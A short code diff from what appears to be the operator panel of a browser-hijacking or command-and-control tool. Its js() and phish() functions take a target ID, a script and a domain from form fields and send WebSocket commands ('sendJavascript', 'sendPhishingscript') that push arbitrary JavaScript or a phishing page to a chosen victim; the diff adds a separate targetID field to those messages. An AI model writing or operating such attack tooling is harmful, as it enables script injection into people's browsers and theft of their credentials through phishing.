@@ -92,14 +92,14 @@ function js(){
     var id = document.getElementById("JS_ID").value;
     var script = document.getElementById("JS_Script").value;
     var url = document.getElementById("JS_URL").value;
-    var jsonPackage = {id: id, type:"sendJavascript", script:script, domain:url};
+    var jsonPackage = {id:"0", targetID: id, type:"sendJavascript", script:script, domain:url};
     ws.send(JSON.stringify(jsonPackage));
 }
 
 function phish(){
     var id = document.getElementById("Phishing_ID").value;
     var url = document.getElementById("Phishing_URL").value;
-    var jsonPackage = {id: id, type:"sendPhishingscript", domain:url};
+    var jsonPackage = {id:"0", targetID: id, type:"sendPhishingscript", domain:url};
     ws.send(JSON.stringify(jsonPackage));
 }
 
